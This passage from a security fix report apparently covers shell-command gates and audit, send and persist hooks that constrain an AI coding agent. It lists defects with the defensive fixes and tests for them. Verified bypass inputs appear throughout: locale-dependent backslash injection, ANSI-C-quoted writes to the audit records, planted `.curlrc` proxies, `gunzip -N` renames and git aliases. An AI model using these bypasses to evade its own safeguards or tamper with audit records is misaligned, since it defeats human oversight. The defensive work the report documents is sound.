`mutate` instead of refused (F504). Its `\|\s*(rm|tee|dd)\s` alternative
could match only quoted text (unquoted pipes split the line). The same held
for the interpreter pattern (`rm -rf x 'python3 -c '` was `execute` and
`send`, without `mutate`) and the network pattern (`rm -rf x 'ssh h'` was
`send` alone).

- Fix (mapper): a class narrower than the worst case comes only from the
  command's program, its first word as the shell passes it: the local file
  programs by word (`rm`, `rmdir`, `mv`, `chmod`, `chown`, `ln`, `unlink`,
  `shred`, with an argument; a quoted `'rm -rf'` or `RM` is no longer one),
  the local git changes by word (`_local_git_change`: `git reset`, `git
  checkout --`, `git clean`, `git branch -d|-D`, every `git stash` form), and
  the network and remote-mutation patterns matched from the start of the
  words (`re.match`, case-sensitive). The interpreter pattern still matches
  anywhere (a program that runs another, `env` or `xargs`, may run it), and
  `_worst_case(capability)` now always holds `mutate` and `send` with
  `capability` first, so a match can only add `execute`. A program that
  sends is `send` and `mutate` (`curl -o`, `scp` and `rsync` write local
  files): no pattern result lacks a capability the worst case has, but the
  local mutations the program itself names. `cp` is no longer read as a
  local mutation: its alternative (`cp\s+.*\s+/` followed by a blank)
  matched only a word that is `/` alone, so it already took the worst case.
- Consequence: a read-only command whose argument holds such text (`grep
  'git reset' f`, `git log --grep='docker rm'`) now observes (it was gated:
  the argument set the class), and an interpreter found anywhere is
  `execute`, `mutate`, `send`, so a profile's rule for `mutate` applies to it.
- Tests: `TestArgumentText` (ten decoys keep the worst case; every base
  program × 14 texts × 2 quotings keeps every capability it has alone; the
  program gives the class; a quoted or upper-case program name is no
  program; F504 under a policy with approvals `ask` and `off`; the plugin
  hook gates them), the reported lines added to
  `test_a_command_that_may_send_is_f504_under_a_policy`, and a 4096-byte
  line of decoys classified in bounded time.

#### 2. `sed -i`, `docker rm|rmi|prune` and the git changes where git fetches or runs a hook were local `mutate` (medium)

`sed -i` runs a command through GNU sed's `e` command or `s///e` flag
(verified: both wrote their sentinel); `docker rm|rmi|prune` sends its
request to the daemon `DOCKER_HOST` or the docker context names (verified:
a listener on `DOCKER_HOST` logged `DELETE /v1.xx/containers/<name>`); in a
partial clone `git reset --hard HEAD~1` and `git reset HEAD~1` fetched the
objects they lacked (verified: missing objects went from 1 to 0), and `git
stash apply <a commit not in the clone>` fetched. Each was `mutate` alone.

- Fix (mapper): `sed` (`-i` or not) and `docker rm|rmi|prune` are on no
  list: the worst case, as `sed` and the other docker commands already
  were. A local git change takes the worst case where `_git_change_gated`
  holds: what `_git_read_gated` asks (a git directory that may be content, a
  program the configuration names, a partial clone or submodules) or a hook
  git runs on such a change (`git_change_may_run`: `post-index-change`,
  `reference-transaction`, `post-checkout`; found by running every hook git
  documents on each form: `git reset` and `git stash` run
  `post-index-change` and `reference-transaction`, `git branch -d` and `git
  stash drop` `reference-transaction`, `git checkout --` `post-checkout` and
  `post-index-change`, `git clean` none; git-lfs installs a `post-checkout`
  that fetches). `git_config_may_run` and `git_change_may_run` share one
  lookup (`_repository_runs`) and differ in the hooks they look for.
- Sibling (fixed): batch 1 made a recorded restore a gated `mutate` where
  the configuration names a program (a smudge filter, a merge driver); that
  program may send anywhere, so the restore now takes the worst case, as
  the reads there do (it is the hook's gated `mutate` there too: the hook
  applies no destination policy).
- Kept: `git stash create` and the restore of a recorded checkpoint keep
  their classes in a partial clone (a probe fetched nothing for either; a
  recorded restore ran only `post-index-change`, which
  `git_config_may_run` already counts).
- Tests: `TestLocalChangesThatReachFurther` (the fixtures above; ten sed and
  docker forms take the worst case; nine git changes in a partial clone take
  it and stay `mutate` in a plain repository; three hook fixtures run their
  hook and take it; a `pre-commit` hook gates nothing; a failed lookup is a
  yes; F504 under a policy). Batch 1's expectations made stricter:
  `git stash create` there is `checkpoint, execute, mutate, send`, a
  recorded restore there `mutate, send`, and `python3 -c` and `curl -X POST
  ... -d` gained `mutate`.

#### 3. A backslash after some UTF-8 characters is half a character in a double-byte locale (medium)

The mapper reads the command as Unicode text; bash reads its bytes in the
user's locale. In GBK, GB18030, BIG5 or Shift JIS, the last byte of some
characters' UTF-8 form is a first byte whose second byte may be 0x5C, the
backslash: `ls ぁ\;touch pwned.txt` is one `ls` to the mapper and `ls ぁ\`
then `touch pwned.txt` to bash (verified with locales built by `localedef`:
GBK and BIG5 created the file, `C` did not; the double-quoted form `ls
"ぁ\";touch pwned_dq #"` too). The adapter allowed it as `observe`.

- Fix (mapper `_simple_commands`): a line with a backslash right after a
  character outside ASCII cannot be read (the worst case), wherever it is.
  Why that suffices: a second byte is 0x40 or above (0x30 to 0x39 in a
  GB18030 four-byte form), so the only byte bash can take from the line is
  one of `@`, letters, digits, `[ \ ] ^ _ { | } ~` and the backtick; every
  one of them but the backslash only takes an operator, a glob or a quote
  from bash, which then runs fewer commands than the mapper read; only a
  backslash bash does not see makes the next character active. A backslash
  after an ASCII character is not affected (a second byte follows a first
  byte of 0x81 or above, and no ASCII character is one).
- The plugin hook already refuses any `\` (a test keeps it so for these
  lines).
- Tests: `TestDoubleByteLocales` (bash in GBK and BIG5 runs the second
  command, in `C` it does not; six lines take the worst case; five lines
  with such characters but no backslash right after one still observe;
  F501 without a checkpoint, F504 under a policy; the plugin hook's F501).

#### 4. `pip` was missing from `_ARGUMENT_WRITERS` (medium)

Round 2 put `pip list` and `pip show` on the allow-list, read-only with the
options `_SUBCOMMAND_OPTIONS` lists, but a word the shell expands was read as
the literal `*`: `pip show *` in a directory holding a file named
`--log=pwned-by-glob.log` wrote that log (verified with pip 24.0), and
`--proxy=...` in a file name makes pip ask that host.

- Fix (mapper): `pip` joins `_ARGUMENT_WRITERS`; every command whose
  options `_writes` reads is now there (checked: the allow-list's other
  commands, `ls`, `cat`, `grep`, `wc` and the rest, have no option that
  writes, runs or sends). The plugin hook does not list `pip`.
- Tests: `TestPipGlobs` (five glob forms take the worst case; `pip show *`
  writes the log a file name names; the plugin hook gates it), and `pip show
  *` and `pip list *` added to
  `test_arguments_the_classifier_does_not_take_as_read_only`.

#### 5. The persist hook worked out the file after an Edit differently from Claude Code (medium)

The hook read the target's raw bytes and applied old_string/new_string with
its own rules; Claude Code 2.1.330 (read in its binary, not run) reads a file
opening with FF FE as UTF-16LE, turns CRLF into LF before matching, removes
`old_string` with the line break after it when `new_string` is empty
(`bos`/`Uur`), and finds a non-ASCII `old_string` as the file's `\uXXXX`
escapes (and an escape in `old_string` as the character), escaping
`new_string` to match (`Vrt`, `de`). Where the hook found no `old_string` it
scanned only the carried text: a CRLF file with an `old_string` spanning a
line break, a UTF-16LE file, two Edits whose second deletes `DELETE-ME` and
so joins `password: "` to its value, and a JSON file whose `café` is
`café` each stored a password the scan recognises.

- Fix (`skills/persist/SKILL.md`): the file is read as Claude Code reads it
  (FF FE: converted with `iconv`, refused R407 without it; CRLF read as LF);
  each edit is applied as Claude Code applies it (as written, else with
  curly quotes read as straight ones; the empty-`new_string` rule; first or
  all occurrences); an `old_string` an existing file holds in neither form
  is refused (R407, a message of its own, by jq's `halt_error(3)`): Claude
  Code may still find it through an escape, and the hook cannot tell what
  the file will hold. A file that does not exist is read as empty, as
  before (Claude Code fails such an Edit).
- Sibling (fixed, time): every `join` in the hook's jq is now `joined`, which
  is linear (`add` over the pieces): jq 1.7's `join` copies what it has
  built at each piece, so reading a 1 MB file of CRLF lines as LF took
  3.4 s and a 4 MB one about a minute, past the hook's 30 s limit (which
  blocks the call), and a 1.4 MB Write of 32,000 new lines took 2.2 s (now
  0.7 s).
- Not changed: the audit skill's Edit hook refuses any edit of the records
  file whatever it holds; the SDK adapter and the binding apply no file
  edit (their `persist` checks read the call's data).
- Tests: `test_reads_the_file_as_claude_code_edits_it` (CRLF, UTF-16LE, the
  two-call empty-`new_string` sequence, the file written between calls as
  Claude Code would), `test_refuses_an_old_string_it_does_not_find` (an
  escape in the file, an escape in `old_string`, an absent `old_string`,
  each as Edit and MultiEdit; the absent case moved here from the allow
  test, where it was allowed), `test_a_utf16_file_needs_iconv`,
  `test_a_file_that_is_not_there_is_read_as_empty`, a control for the
  empty-`new_string` rule, two allow cases (a CRLF and a UTF-16LE edit
  that adds no credential) and a bounded-time test (a 4 MB CRLF file and
  Write, each under 15 s), in sh and bash.

#### Siblings checked

- Batch 1 and rounds 1 and 2 hold: their tests pass (three expectations
  stricter, above); the quoted-operator reading, the 4096-byte bound (a
  4096-byte decoy line classifies in bounded time), `printf -v`, the
  partial-clone and configured-program reads.
- Other narrowing classes: `observe` (the allow-list, `_writes`) and the
  `git stash` line-of-one classes read words, not joined text; the remote-
  mutation pattern gave the worst case anyway and is now anchored too.
- The TypeScript package and the binding classify no shell command and edit
  no file; the plugin hook gates every line above as `mutate` (it applies no
  destination policy) and refuses any backslash.

#### Documentation

SECURITY.md (§5.4's persist row; §5.5's paragraph on the adapter's Bash
classifier), `docs/integrations/claude_agent_sdk.md` (the Bash
classification text and table: classes from the program only, `sed -i`,
`docker rm`, the local git changes and `git_change_may_run`, `execute,
mutate, send` and `send, mutate`, the backslash rule, `pip` globs), the
mapper's comments and docstrings, the persist hook's comment, and
CHANGELOG [Unreleased] Upgrading (the SDK's Bash entry; the plugin's
persist entry). No version changes.

#### Checks after batch 2

- Python: `pytest tests/` (6354 passed, 18 skipped), and again the eight
  affected files after the last hook edit (2033 passed); ruff check and
  format with CI's lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; `sync_skill_schemas.py --check` and the generators' `--check`
  (no fixture or vector changed); `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun and no core
  was rebuilt.
- TypeScript: `packages/acs-core` build, check and test (2007); the
  binding's check and test (235 passed, 2 skipped). No TypeScript source
  changed: neither classifies shell commands nor edits files.
- Site: `npm run check`, `npm test` (1173).
- Old code: the new mapper tests with 3ecf6aa's mapper (82 of 119 failed)
  and the new persist tests with 3ecf6aa's hook (14 failed), above.
- Probes, each under `timeout 120` and a 4 GB address-space limit, inputs of
  at most 1.5 MB: every reported line through `map_tool` before and after
  (all now the worst case or stricter); the persist hook on 1 MB of CRLF
  lines (3.5 s with jq's join, 0.4 s with the linear one, linear from 256
  KB to 1 MB) and a 1.4 MB Write (2.2 s before, 0.7 s after). No CLI or nested
  agent was started (Claude Code's edit functions were read in its binary
  with `grep`); the docker listener and every other process were stopped;
  the scratch repositories, locales and inputs were removed.

### Batch 3: four reported defects

Four defects, each reproduced by an independent verifier on 6004f78 and
reproduced again here on 6b41119 (batch 2's commit) before any change: two
in the audit skill's command hook, one in the send skill's, and one in how
the TypeScript package and the Python MCP factory read a carrier of a tool
binding record. None was fixed by an earlier batch (git log and rounds 1 to
3 checked; batches 1 and 2 changed no skill hook but persist's and no
carrier). Each fix has tests that fail on the code before it: the new skill
hook tests run against 6b41119's hooks in a scratch tree (the test file,
its fixtures, the hooks and the skills, 4.7 MB, removed) gave 132 failures
of 198 (audit) and 88 of 154 (send and rollback); what passed is the
controls (commands each hook must leave alone, the moves the new mv rule
allows) and sibling forms the old hooks refused for another reason (a
literal `.claude` beside `$"..."`, a `$` in a path). The new TypeScript
test fails with 6b41119's `annotationRecord` (1 of 81 in the package; 3 of
95 in the binding's three files), and the Python factory tests with
6b41119's `mcp.py` (4 of 5; the fifth is the control).

The skill hooks are host-specific narrowings (§5.18.10's last paragraph);
the plugin's pre-tool-use hook gates every reported command as a `mutate`
(or `send`) a person approves. Each defect is a hook that did less than
SECURITY.md §5.4 says.

#### 1. The audit hook's gate did not read `$'...'`, so a records path spelled with ANSI-C quoting skipped every check (medium); siblings: escaped quotes, line continuations, command substitutions, the send and rollback gates

The gate looked for `records|jsonl|audit|\.claude` with quotes and
backslashes removed; `$'\x2ecla\x75de/a\x75dit/rec\x6frds.js\x6fnl'` and the
octal form spell the path with none of them, and `tee` and `cp` are not on
the writer list, so `tee -a $'...'` appended a token to the records file
(bash, verified). Siblings found here, each exit 0 on 6b41119:

- the shared word reader (`hooks/shell_words.jq`) did not pair quotes as
  bash does: an escaped quote (`echo "\"" ; git apply p ; echo "\""`,
  `echo \' ; ...`, `echo $'\'' ; ...`) made it read the commands after it
  as one quoted word, so the audit hook's rules for every command (the
  writer list, the glob that may name the file) did not see `git apply`
  or `tee -a .c*/a*/r*`; a backslash in a name stayed in the word
  (`pat\ch` was not `patch`);
- a line continuation split a name the gates look for (the `tr` they use
  reads lines): `tee -a .cl\<nl>aude/au\<nl>dit/rec\<nl>ords.js\<nl>onl`
  (audit), `cu\<nl>rl 127.0.0.1:18777/` (send: no address check at all),
  `git sta\<nl>sh apply <unrecorded>` and `git $\<nl>'\x73tash' apply`
  (rollback; bash restores);
- the writer rule did not read a command substitution's command (`` echo
  `git apply p` ``, `` x=`git apply p` ``, `echo "$(git apply p)"`), nor the
  commands after quotes nested inside one (`echo "$(echo '"')"; git apply
  p; echo '"'`);
- the reader's operator pattern took the digits after any `>` as a file
  descriptor (`>2` read as an operator with no target).

- Fix (shared reader, all four copies): words and segments pair quotes as
  bash does: a backslash escapes the next character (unquoted, in double
  quotes before `$`, `` ` ``, `"`, `\` or a newline, and in `$'...'`, kept
  whole); a line continuation is removed, also between an operator's
  characters (`<\<nl><` is `<<`) and before a comment; a lone backslash or
  an unclosed `$'` is `bad`. Each word gains `ansi` (it holds `$'...'` or
  `$"..."`, kept as written) and `subst` (a backtick, or `$(` or `${` in
  double quotes). Digits follow only `>&` and `<&`. Checked against bash on
  4000 generated commands (escapes, `$'...'`, `$"..."`, continuations in
  words, operators and before comments, comments, globs): no difference but
  the expansions the reader does not make (`${HOME}`, `$'\x41'`); the old
  reader differed on 416 of 500.
- Fix (audit gate): `$'` or `$"` in the command, or in it with its line
  continuations joined (`$\<nl>'`), sends it to the full reading, which
  refuses `$'...'` and `$"..."` (the `subst` refusal names them); the name
  grep removes line breaks; the writer grep reads the command as written
  and with its line continuations joined (`a\\<nl>tar` keeps the break).
- Fix (audit, every command): where the reader cannot follow the command
  (an unclosed quote, a word with `subst`), it is read again with no
  quoting at all (each real line continuation removed, a backtick read as
  `;`, a `#` as a letter, every quote and backslash removed), which reads
  more commands than bash runs and every one it runs; the writer rule and
  the glob rule apply to both readings. So a command substitution in
  quotes is read; the documented limit drops it.
- Fix (send and rollback gates): the same line-break removal and
  joined-continuation `$'` check; the send hook's glob rule for tool names
  reads the joined text too (`c?\<nl>rl`).
- Tests: `test_blocks_a_name_spelled_with_ansi_c_quoting` (11, the
  reported three and the verifier's siblings), `test_an_ansi_c_spelled_
  name_is_the_records_file` (bash writes the token; the hook refuses
  first), `test_reads_quotes_and_escapes_as_bash_does` (15), and in send
  and rollback the line-continuation and escaped-quote cases.

#### 2. The audit hook's `mv` rule compared base names, so any `records.jsonl` came in as a moved-aside file and the live records could leave (medium); siblings: a moved-aside file named by a glob, programs that write the files their input names

`mv /tmp/x/records.jsonl .claude/audit/records.1.jsonl` and `mv
.claude/audit/records.jsonl /tmp/records.gone.jsonl` passed. The reported
chain (`base64 -d`, `gunzip -N`, `mv`) left a token in
`.claude/audit/records.1.jsonl`; the verifier's escalation then overwrote
the live file with `gunzip -fN -S l .c*/a*/r*1*`, whose glob `may_name`
did not read (it matched only `records.jsonl` as the last component).

- Fix (mv): both operands, resolved from the call's directory with
  `${CLAUDE_PROJECT_DIR:-.}` at the start read as the project's directory
  (the hook's `CLAUDE_PROJECT_DIR`, else the call's directory), must be in
  `<project>/.claude/audit`, the source `records.jsonl`, the target
  `records.<x>.jsonl`; a `..`, a `~`, an expansion, a glob, a brace or
  `$'...'` is refused. Both operands with the prefix stay in one directory
  whatever the Bash tool's environment expands it to.
- Fix (`may_name`): a glob or a brace that may name any file of
  `.claude/audit` (`.c*/a*/r*1*`) sends the command to the full reading.
- Fix (writers, every command): `gzip`, `gunzip`, `pigz`, `unpigz` with
  `-N`/`--name` (or abbreviated, or in a cluster) or where the command
  names `GZIP` (gzip 1.12 honours `GZIP=-N`, verified); `curl` unless `-q`
  (or `--disable`, or a cluster starting `-q`) is its first word (it reads
  `.curlrc`, which may set `remote-header-name` and `output-dir`) and with
  `-J`, `-K`, `--remote-header-name`, `--config`, `--variable` or
  `--expand-*` (abbreviations read: curl 8.5 takes `--remote-header`);
  `wget` unless given `--no-config` (exact; wget honours it anywhere,
  verified) and with `--content-disposition`, `--trust-server-names`,
  `-r`, `-m`, `-p`, `-x`, `-i`, `-e`, `-B`, `-F`, `--config` and the like;
  HTTPie, `aria2c`, `ditto`, `xar`, `aa`, `aunpack`, `atool`, `dtrx`,
  `patool`; `dpkg -x|-X|-i|-R`, `rpm -i|-U|-F`; `python -m zipfile|tarfile`;
  and a git command that is not one of git's own (git 2.43's list and a
  few later ones): an alias a configuration file or `GIT_CONFIG_*` defines
  runs `git apply` (verified: `[alias] x = apply` in `.git/config`, then
  `git x notes.patch`, wrote the token), and the hook refused only
  `-c alias.*`, `--config-env` and `git config alias.*`. A bare `git` or
  `git --version` is left alone (it was refused, but the gate never read
  it).
- Not changed: package installers' scripts and a program named by a
  variable stay the documented limit (code a script runs, a name built when
  the command runs).
- Tests: the reported moves and ten siblings in
  `test_mv_only_moves_the_records_file_aside`, `test_mv_of_a_path_the_
  shell_builds_is_refused`, `test_mv_moves_the_records_aside_in_their_
  directory` (four allowed forms), `test_blocks_more_programs_that_write_
  files_their_input_names` (31), `test_still_allows_these_commands` (19
  controls, the commit here-document among them), `test_a_name_gunzip_
  restores_is_refused_before_it_runs` (gunzip restores the stored name;
  each step refused) and `test_a_git_alias_from_a_configuration_file_is_
  refused` (the alias applies the patch; the hook refuses first).

#### 3. The send hook never read the setting files curl and wget take at run time; a brace or glob spelling, `~/.ipfs/gateway` and `IPFS_GATEWAY` were not on its lists (medium); siblings: wget's, a Write of the files

`tee ~/.cu{r,r}lrc`, `tee ~/.c*rlrc`, `tee -a /etc/ho{s,s}ts`, `> ~/.ipfs/gateway`
and `tee ~/.wge{t,t}rc` passed, after which a plain `curl` or `wget`
reached a 127.0.0.1 listener; `export IPFS_GATEWAY=http:/127.0.0.1:18777;
curl ipfs://...` did in one command. Reproduced here with a listener (a
`.curlrc` proxy: the plain request logged `GET http://example.com/
Host=example.com`; with `-q` nothing reached it).

- Fix (requests): `curl` runs only with `-q` (or `--disable`) first, `wget`
  only with `--no-config`, HTTPie only where the configuration file it
  reads (`$HTTPIE_CONFIG_DIR`, `$XDG_CONFIG_HOME/httpie` or
  `~/.config/httpie`, and `~/.httpie`) sets no default options (it has no
  option to skip the file; an unreadable file refuses), so no setting file
  can redirect a request whatever wrote it, before the skill ran too; and
  no `ipfs://` or `ipns://` URL (the gateway decides the host). The rule
  applies where the tool runs a request (it is the program, or after one
  that runs another), so `apt-get install curl` and `curl --version` pass.
  Another refusal of the same request is reported first.
- Fix (every command): a glob or a brace that may expand to a setting file
  (`.curlrc`, `.config/curlrc`, `.wgetrc`, `etc/wgetrc`, `etc/hosts`,
  `etc/resolv.conf`, `resolve/resolv.conf`, `.ipfs/gateway`,
  `httpie/config.json`, `.httpie/config.json`: last components matched, a
  leading dot only by a dot, the last pattern holding a letter or a digit)
  is refused; each run's brace words are computed once for this and the
  tool-name rule (distinct runs at the 16384-byte bound: 1.7 s for braces,
  0.9 s for globs).
- Fix (lists): `ipfs` in the gate, `\.ipfs(/|$)` and `httpie/config` in the
  setting files, `IPFS_GATEWAY`, `IPFS_PATH`, `SYSTEM_WGETRC` and
  `HTTPIE_CONFIG_DIR` in the setting variables.
- Fix (new hook): an Edit, Write, MultiEdit or NotebookEdit of those files,
  by the path as written and the file it reaches (links followed), is
  refused (the matcher was Bash only).
- Not changed: a name that resolves to an internal address (a hosts file a
  name built at run time writes) stays the documented limit; the plugin
  applies no destination policy, so §4.4.2 binds no destination here.
- Tests: `test_blocks_a_setting_file_however_it_is_named` (12),
  `test_blocks_a_request_a_configuration_or_a_gateway_redirects` (15),
  `test_curl_reads_its_configuration_file_unless_given_q_first` (the
  fixture's own check, offline), `test_httpie_runs_only_without_default_
  options` (5 configurations × 2 directories), `test_an_edit_of_a_setting_
  file_is_refused` (14 paths × 3 tools), `test_an_edit_through_a_link_to_a_
  setting_file_is_refused`. Tests changed to the new rule: the allowed
  request examples now run `curl -q` and `wget --no-config` (and the audit
  hook's allowed `curl` with a secret header, `curl -q`); the refusal of
  the plain forms is in the new tests.

#### 4. An annotation (or MCP metadata) was read in part: an unknown member was dropped, not S303 (medium)

`annotationRecord` copied only the record's members and `x-` keys, so
`{capability: 'retrieve', aproval: {...}}` or `flag: {...}` loaded as a
plain retrieve: a composite's nested call of such a tool ran with no
approval, checkpoint or destination check, `lintPromptTools` passed it and
`deriveAgentManifest` understated the agent. The Python factory's `_record`
did the same with MCP metadata.

- Fix (TypeScript): `annotationRecord` passes every member but the copies
  (`tool`, `layer`, `risk`, `mutation`, `requires_checkpoint`,
  `requires_approval`) to the record, built with `Object.fromEntries` so a
  member named `__proto__` stays a member; `checkBindings` reports the
  unknown one (S303) and does not load it: V107 in a composite's
  `invokes`, W617 in the lint, a malformed tool in `deriveAgentManifest`.
- Fix (Python): `_record` passes every metadata member but `tool`,
  `capability_id` and the flat flags (which it reads into `capability` and
  `flags`); a metadata `ontology` is now the record's. A tool with no
  capability that is not control-only stays unbound unless its metadata
  holds a member no record has (a misspelt `capabilty`): that record goes
  to the loader, so the factory raises rather than leave the tool unbound
  unnoticed.
- Fixture: `tests/conformance/bindings/unknown_member.json` (a record with
  `aproval` is S303, not loaded), generated by
  `scripts/gen_call_fixtures.py`; both runners count 36 binding fixtures.
- Tests: `annotationRecord` keeps an unknown member (four annotations, the
  `__proto__` one included, each S303; copies and vendor data still load);
  the binding's V107 test (three misspelt records), manifest test (two)
  and lint test (W617); the factory raises S303 for four metadata forms and
  registers nothing, and reads copies, flat flags and vendor data as
  before.

#### Siblings checked

- Rounds 1 to 3 hold: every skill hook test passes (1437), the persist
  hook's reading is unchanged (it does not use the shared reader), and the
  rollback hook's recorded restore still restores (`git stash apply <id>`,
  and `git "stash" apply <id>`).
- The plugin's pre-tool-use hook and the SDK mapper refuse any backslash
  or read the worst case for each reported command; neither reads a carrier
  of an annotation, and the SDK adapter's own records go through the same
  loader (`parse_record`, S303 for an unknown member already).
- The other users of `checkBindings` and `parse_record` take records, not
  carriers, so they read every member already.

#### Documentation

SECURITY.md §5.4 (the audit, send and rollback rows; a row for the send
skill's new Edit and Write hook), the three hooks' header comments,
`hooks/README.md` (the shared reader's quoting), `docs/integrations/
standard_agents.md` (an annotation's unknown member), the factory's
docstring, spec/CONFORMANCE.md (36 binding and 32 call-sequence fixtures;
the counts were stale), and CHANGELOG [Unreleased] Upgrading (the plugin's
skill hooks; the MCP metadata; `annotationRecord`). The Standard's text
was not changed: §5.18.1 already says a carrier is read as the record and
an unknown member is S303. No version changes.

#### Checks after batch 3

- Python: `pytest tests/` (6676 passed, 18 skipped), and again the files
  the last edits touched and every file that reads the docs (1769 passed;
  `tests/test_skill_hooks.py` 1437); ruff check and format with CI's
  lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; `sync_skill_schemas.py --check` and the generators'
  `--check` (one binding fixture added, written by its generator);
  `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun and no core
  was rebuilt.
- TypeScript: `packages/acs-core` build, check and test (2009; the
  WebAssembly build reused); the binding's check and test (236 passed, 2
  skipped).
- Site: `npm run check`, `npm test` (1173; the fixture counts the site
  reads come from tracked files, so the new fixture is added to git first).
- Old code: the new tests against 6b41119's hooks, `annotationRecord` and
  `mcp.py` (above, per defect).
- Probes, each under `timeout 120` and a 4 GB address-space limit, inputs
  of at most 1 MB: every reported command against the old hooks (exit 0)
  and the new ones (refused); the reader against bash on 4000 generated
  commands; a listener on 127.0.0.1:18777 reached by a plain `curl`
  through a planted `.curlrc` proxy and not by `curl -q`; `GZIP=-N
  gunzip` restoring a stored name (gzip 1.12); wget honouring
  `--no-config` after the URL and curl `-q` only as the first word. Timing
  at the 16384-byte bound: the audit hook 0.04 to 1.7 s (a backtick word
  per four bytes, which the second reading reads, 1.7 s; the old reader
  took 0.58 s for a word per two bytes), the send hook 0.04 to 1.7 s
  (distinct brace runs 1.7 s, glob runs 0.9 s, a word per three bytes
  1.6 s), a 1 MB command to the audit hook 0.36 s. No CLI or nested agent
  was started; the listener and every other process were stopped; the
  scratch tree, projects and archives were removed.

### Batch 4: five reported defects

Five defects, each reproduced by an independent verifier on 6004f78 and
reproduced again here on 4cec757 (batch 3's commit) before any change: two
in the Standard Agents binding's nested calls (a decoder message that cut a
secret before redaction; checks that threw instead of refusing), and three
in what the Python runner and its host write (the idempotency log, an
event's or a tuple's anchors, a cancel's reason). None was fixed by an
earlier batch: git log and rounds 1 to 3 checked (round 2 #20 added the
nested output check whose decoder message leaked; round 2 #22 recorded the
R407 of a grounded call's secrets function, not a nested call's; round 2
#23 redacted an `Output`'s anchors given as a list, not an `Event`'s or a
tuple; round 1's idempotency fixes kept `evidence_seen` for replay, not
redacted). Each fix has tests that fail on the code before it (below, per
defect, with the controls that pass on both).

#### 1. A nested plain call's non-JSON output put a window of its text into the R402 entry, so part of a registered secret escaped redaction (medium)

`decodeCapabilityOutput` (`packages/acs-core/src/output.ts`) appended V8's
`JSON.parse` message, which quotes the text (all of it up to 20
characters, else about 10 characters around the error). The binding's
nested output check made it the R402 entry's `error`, and redaction ran
after: a registered secret cut by the window no longer matched, so
`"Zq8-rotati"...` stayed in the trace and in `actionRecord`'s
`details.error`; the verifier also showed a password whose member name
the window cut (`..."assword": Tr0ub4dor,"...`), which the name-keyed
pattern no longer recognised.

- Fix: the decoder no longer repeats the parser's message; it says the
  text is not the JSON text of one object and nothing else, and where it
  stops being JSON when the parser says (`(at character N)`, digits read
  from the message, nothing else of it). Python's decoder quoted nothing
  already (`json.loads` messages name positions only; a duplicate member
  is quoted whole, which redaction still matches).
- Vectors (`tests/conformance/output/vectors.json`, both runners): a
  decode vector may state `quotes_nothing_of`, a string the text holds;
  the refusal's message (the diagnostic's text and the thrown error's)
  must hold no piece of four or more characters of it. Three new vectors:
  `text_starting_with_a_secret`, `unquoted_secret_value`,
  `unquoted_password_member`. The three fail on 4cec757's `output.ts` (the
  Python runner passes them on both: its decoder never quoted).
- Binding test (`test/nesting.test.ts`): `keeps no piece of a secret from
  an output that is not JSON in the R402 entry or its action record (§6.7)`
  (the reported probe: a registered secret leading the text, as an
  unquoted value, and an unquoted password): fails on 4cec757's built
  package.
- Siblings checked: the decoder's other messages (a missing field, a
  confidence out of range, the integer beyond ±2^53, a key with a lone
  surrogate) name fields, the whole integer or a whole key; no other
  binding or package path parses host text and keeps the parser's message
  (`parseJsonExact` is used by the fixture runners only), and nothing in
  the binding cuts text before redacting it.

#### 2. A nested plain call refused because the layer could not read its records or arguments threw out of the nesting state: no R407, no record (low; sibling of round 2 #22)

`invokePlain` ran the secret scan (`holdsCredential`), the destination,
approval and prerequisite checks (`readExecuted`) outside any try: a store
read that failed, or arguments the scan cannot walk (a cycle, 20,000
levels of nesting), threw into the composite's code. Nothing ran, but the
layer neither returned §9.8's R407 nor recorded the refused call
(§5.18.8). The grounded branch of the state's `invokeTool` threw the same
way when `digestOf(args)` failed. Found here too: a nested plain call
whose arguments have no canonical JSON and whose capability has no secret
scan (a `retrieve` with a cycle) ran, recorded without an `args_digest`,
where a grounded tool's own check refuses such arguments with R407.

- Fix (`examples/standard_agents/src/acs/grounded.ts`): the checks before
  a nested plain call runs are one function (`checksBefore`), called in a
  try; a check it cannot complete returns `refuseNested('R407', ...)`, a
  `refused` entry with `covered_by` and `recorded_by`, written under
  `serially` and best effort (a `refused` entry reads no `acs:executed`,
  so it is written while that read fails). Arguments with no canonical
  JSON are such a check: the first one, so a plain call with them never
  runs. The grounded branch refuses with R407 too when the digest that
  binds the nesting token cannot be computed, recorded with the covering
  call's `covered_by` while it runs (`recordRefusal` takes the code). A
  refusal names a listed grounded tool's own capability
  (`boundCapability` reads `PERFORMS` of the listed definition before the
  realm-wide name map, which is `null` once two tools of one name
  disagree).
- Tests (`test/nesting.test.ts`, `a nested call the layer cannot check is
  refused and recorded`): a plain `persist` and a plain `retrieve` whose
  `acs:executed` read fails inside the composite, a plain `persist` and a
  plain `retrieve` with cyclic arguments and with arguments nested 20,000
  deep (about 100 KB), a grounded `persist` with cyclic arguments and a
  grounded `retrieve` nested 20,000 deep: each R407, one `refused` entry
  with `covered_by` and `recorded_by`, the tool not run, nothing executed
  but the composite. All 8 fail on 4cec757's `grounded.ts` (the retrieve
  with a cycle ran there); the control (a plain persist the layer can
  check runs and is recorded `executed`) passes on both.
- Siblings checked: `queueTool` reads nothing that can fail; `controlTool`
  is never refused by design and reports a record it cannot write; a
  grounded tool's own `check` has caught these since round 1.

#### 3. IdempotencyLog wrote a send's whole output to its file unredacted, and redacted the destination without the runner's registered secrets (medium)

`perform` stored `response["value"]` and `evidence_seen` as the effect
returned them, and `Host.send_once` calls it inside `invoke_capability`,
before the runner redacts anchors: the log's file kept a presigned URL's
`X-Amz-Credential`, a URL's password and a receipt's bearer token, which
the run itself no longer held. The log redacted only the destination,
with its own redactor (`DEFAULT_REDACTOR` unless the host passed one), so
a secret the runner registered stayed in the destination, and the
rollback's `not_covered` item repeated it (`_transmitted_since` used the
default redactor).

- Fix: the runner's anchor redaction is one function,
  `grounded_agency/workflows/_responses.py` (`redact_anchors`), which the
  runner and the log share. The log keeps a done entry's output as the
  runner submits it (anchors redacted without their digest, `evidence_seen`
  rewritten by the runner's rule, so two anchors one after redaction are
  listed only when the host listed both) and then replaces every other
  secret its redactor recognises in the output and in `evidence_seen`
  (`_kept`); a replay answers with that output. The effect's own response
  is still what the first attempt returns (the runner then redacts its
